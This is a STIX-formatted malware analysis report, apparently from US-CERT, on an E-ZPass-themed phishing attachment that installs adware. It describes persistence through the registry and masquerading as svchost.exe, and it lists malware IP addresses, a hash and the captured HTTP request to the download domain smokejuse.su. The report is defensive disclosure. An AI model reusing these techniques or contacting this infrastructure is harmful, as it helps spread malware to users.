stix:STIX_Header.stix:Title: Highway Toll Themed Email Delivers Malicious Adware
stix:STIX_Header.stix:Description: On 20 August 2014, a government department was notified about a phishing email containing a malicious attachment that installs adware; no further detail surrounding the email is available at this time. When the malicious attachment is opened, the malicious files gains persistence via registry modifications, and downloads and executes additional malware which displays unwanted advertisements to the user.This report was originally published as US-CERT MIFR-387010.

stix:Indicator.indicator:Description: Upon execution, this file creates a copy of itself in the following directory with a name made of random characters:C:\Documents and Settings\%username%\Local Settings\Application Data\uigaffsp.exeThe user is prompted with a dialog box that says the file failed to run. Once the user clicks ok, the malware continues to run. It launches a copy of itself as svchost.exe. This is accomplished in the following fashion:E-ZPass_Washington.exe (MD5 9b6426dbb05eb813a45cc3487f0c3e92) calls ProcessCreate with a path ofC:\WINDOWS\system32\svchost.exe and an image path of C:\Documents and Settings\%username%\Local Settings\ApplicationData\uigaffsp.exe.The version running as svchost.exe then terminates the original E-ZPass_Washington.exe process.

This file (running as svchost.exe) sets several registry keys to start the malware at system start up. It then attempts to connect to several IP addresses to download the second stage malware (adware). The IP addresses noted during analysis include the following:91.121.177.8891.142.223.136173.192.72.226151.3.8.106113.53.247.147196.211.170.88113.53.247.14781.177.22.90198.0.216.35100.184.1.6277.122.211.45During analysis, the malware connected to IP 77.122.211.45 and downloaded the second stage malware (adware). Note: smokejuse.su, shown in the below get request, has been observed resolving to a large number of IP addresses.GET /mod_articles-derf89.34/jquery/ HTTP/1.1Accept: */* Connection: CloseUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 4.0.3219) Host: smokejuse.su Cache-Control: no-cacheHTTP/1.1 200 OK Server: nginx

Upon installation, the adware edits several registry keys to maintain persistence. To accomplish its tasks, it forces the system to reboot. After reboot, the adware launches Internet Explorer and connects to several URLs to display ads to theuser. When the user closes the browser, another Internet Explorer browser is launched and the process continues.
The file uigaffsp.exe (MD5 9b6426dbb05eb813a45cc3487f0c3e92) connected to the URL to download second stage malware.
